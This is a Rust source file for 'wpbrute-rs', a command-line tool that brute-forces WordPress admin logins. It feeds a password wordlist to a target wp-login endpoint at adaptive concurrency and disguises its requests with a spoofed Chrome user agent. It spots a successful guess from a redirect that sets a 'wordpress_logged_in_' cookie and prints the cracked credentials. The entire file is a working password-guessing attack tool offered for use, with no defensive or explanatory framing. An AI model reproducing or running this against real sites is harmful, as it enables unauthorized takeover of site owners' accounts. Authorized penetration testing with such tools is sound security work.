use anyhow::Result;
use clap::{crate_authors, crate_version, App, Arg};
use futures::{prelude::*, stream};
use reqwest::header;
use std::{
    fmt::{Debug, Display},
    fs::File,
    io::{BufRead, BufReader},
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    },
};
use tokio::io::AsyncWriteExt;

#[derive(Debug, PartialEq)]
enum Credentials {
    Valid { username: String, password: String },
    Invalid,
}

async fn try_login(
    client: &reqwest::Client,
    target: &str,
    username: impl AsRef<str> + Display,
    password: impl AsRef<str> + Display,
) -> Credentials {
    loop {
        match client
            .post(target)
            .body(format!("log={}&pwd={}", username, password))
            .send()
            .await
        {
            Ok(response) => {
                let set_cookie = response.headers().get_all("Set-Cookie");

                if response.status().as_u16() == 302 {
                    for x in set_cookie.iter() {
                        if let Ok(cookie) = x.to_str() {
                            if cookie.contains("wordpress_logged_in_") {
                                return Credentials::Valid {
                                    username: username.to_string(),
                                    password: password.to_string(),
                                };
                            }
                        }
                    }
                }
                return Credentials::Invalid;
            }
            Err(e) => eprintln!("{:#?}", e),
        }

        tokio::timer::delay_for(std::time::Duration::from_secs(5)).await;
    }
}

async fn print_metrics(
    n_concurrent: Arc<AtomicUsize>,
    total_requests: Arc<AtomicUsize>,
    requests_per_second: Arc<AtomicUsize>,
) -> Result<()> {
    let mut next_round = std::time::Instant::now();

    let mut previous_requests_per_second = 0;
    let mut stdout = tokio::io::stdout();

    loop {
        next_round += std::time::Duration::from_secs(1);

        let n_concurrent_loaded = n_concurrent.load(Ordering::SeqCst);
        let temp = requests_per_second.swap(0, Ordering::SeqCst);

        if (previous_requests_per_second + n_concurrent_loaded) <= temp
            && previous_requests_per_second >= (temp + n_concurrent_loaded)
        {
            // Do nothing.
        } else if previous_requests_per_second < temp {
            n_concurrent.fetch_add(1, Ordering::SeqCst);
        } else if previous_requests_per_second > temp {
            if n_concurrent_loaded > 1 {
                n_concurrent.fetch_sub(1, Ordering::SeqCst);
            }
        }

        previous_requests_per_second = temp;

        let data = format!(
            "{}[2K{} reqs / sec - total reqs {} - concurrency {}\r",
            27 as char,
            previous_requests_per_second,
            total_requests.load(Ordering::SeqCst),
            n_concurrent.load(Ordering::SeqCst),
        );

        stdout.write_all(data.as_bytes()).await?;
        stdout.flush().await?;
        tokio::timer::delay(next_round).await;
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let matches = App::new("wpbrute-rs")
        .author(crate_authors!())
        .version(crate_version!())
        .args(&[
            Arg::with_name("target-wp-login")
                .takes_value(true)
                .multiple(false)
                .required(true)
                .short("t"),
            Arg::with_name("username")
                .takes_value(true)
                .multiple(false)
                .required(true)
                .short("u")
                .default_value("admin"),
            Arg::with_name("password-list")
                .takes_value(true)
                .multiple(false)
                .required(true)
                .short("w"),
            Arg::with_name("user-agent")
                .takes_value(true)
                .multiple(false)
                .required(true)
                .short("a")
                .default_value("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"),
        ])
        .get_matches();

    let password_list = matches.value_of("password-list").unwrap();
    let passwords = BufReader::new(File::open(password_list)?).lines();

    let mut headers = header::HeaderMap::new();

    let user_agent = matches.value_of("user-agent").unwrap();
    headers.insert(
        header::USER_AGENT,
        header::HeaderValue::from_str(user_agent).unwrap(),
    );
    headers.insert(
        header::CONTENT_TYPE,
        header::HeaderValue::from_static("application/x-www-form-urlencoded"),
    );

    let target = matches.value_of("target-wp-login").unwrap();
    let username = matches.value_of("username").unwrap();

    let client = reqwest::ClientBuilder::new()
        .default_headers(headers)
        .redirect(reqwest::RedirectPolicy::none())
        .build()?;

    let n_concurrent = Arc::new(AtomicUsize::new(4));
    let total_requests = Arc::new(AtomicUsize::new(0));
    let requests_per_second = Arc::new(AtomicUsize::new(0));

    {
        let n_concurrent = n_concurrent.clone();
        let total_requests = total_requests.clone();
        let requests_per_second = requests_per_second.clone();

        tokio::spawn(async move {
            match print_metrics(n_concurrent, total_requests, requests_per_second).await {
                _ => {}
            }
        });
    }

    let mut requests = stream::iter(passwords.scan((), |_, password| {
        if let Ok(mut password) = password {
            password.retain(|c| c != '\r' && c != '\n');
            Some(password)
        } else {
            None
        }
    }))
    .map(|password| try_login(&client, target, username, password))
    .buffer_unordered_adaptable(n_concurrent.clone());

    while let Some(credentials) = requests.next().await {
        match credentials {
            v @ Credentials::Valid { .. } => {
                println!("\nCredentials found!\n{:#?}", v);
                return Ok(());
            }
            Credentials::Invalid => {}
        };

        total_requests.fetch_add(1, Ordering::SeqCst);
        requests_per_second.fetch_add(1, Ordering::SeqCst);
    }

    println!("\nAll passwords tried. Exiting.");

    Ok(())
}
